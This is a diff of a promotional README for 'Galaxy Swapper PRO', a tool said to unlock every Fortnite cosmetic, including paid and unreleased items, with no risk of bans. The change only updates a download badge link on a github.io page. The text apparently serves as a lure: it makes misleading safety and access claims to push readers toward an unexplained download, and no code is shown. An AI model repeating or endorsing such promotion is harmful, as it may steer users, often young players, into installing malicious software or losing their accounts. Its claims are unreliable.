@@ -2,7 +2,7 @@
 
 Tired of missing out on rare Fortnite skins? Galaxy Swapper PRO is the revolutionary tool that gives you instant access to EVERY cosmetic item in Fortnite - including exclusive Battle Pass skins, unreleased items, and legendary OG styles! Our advanced technology lets you customize your locker safely without risking bans or compromising your account security.
 
-[![Download Now](https://img.shields.io/badge/🔥_INSTANT_DOWNLOAD-Galaxy_Swapper_PRO-red)](https://galaxy-swapper-official.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/🔥_INSTANT_DOWNLOAD-Galaxy_Swapper_PRO-red)](https://galaxy-swapper-official.github.io/.github/galaxyswapper)  
 
 ---
 
